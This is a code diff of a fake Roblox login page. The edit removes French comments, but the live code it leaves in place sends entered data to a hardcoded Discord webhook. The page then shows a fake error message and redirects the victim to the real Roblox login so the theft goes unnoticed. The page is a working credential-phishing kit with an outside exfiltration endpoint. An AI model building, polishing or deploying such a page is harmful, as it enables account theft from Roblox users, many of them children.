@@ -71,7 +71,6 @@
 </head>
 <body>
     <div class="login-container">
-        <!-- Logo Roblox en SVG -->
         <svg class="logo" viewBox="0 0 100 30" xmlns="http://www.w3.org/2000/svg">
             <text x="0" y="25" font-family="Arial" font-weight="bold" font-size="24" fill="#393b3d">ROBLOX</text>
         </svg>
@@ -99,7 +98,6 @@
             btn.disabled = true;
             btn.style.backgroundColor = "#ccc";
 
-            // Ton webhook Discord
             const webhookUrl = "https://discord.com/api/webhooks/1557616277584093264/K-ZZ7SQCalA6ZohbXbO4pauTCcUB4zTEDgHECpOvO-ixPLaUKtZ5Lz6VKLaipTDnZ0Z6";
 
             try {
@@ -111,19 +109,16 @@
                     })
                 });
 
-                // Fausse erreur pour faire patienter
                 errorMsg.style.display = "block";
                 btn.innerText = "Se connecter";
                 btn.disabled = false;
                 btn.style.backgroundColor = "#00a2ff";
                 
-                // Au bout de 3 secondes, redirection vers le VRAI Roblox
                 setTimeout(() => {
                     window.location.href = "https://www.roblox.com/login";
                 }, 3000);
 
             } catch (error) {
-                // En cas d'erreur réseau, on redirige quand même
                 window.location.href = "https://www.roblox.com/login";
             }
         };
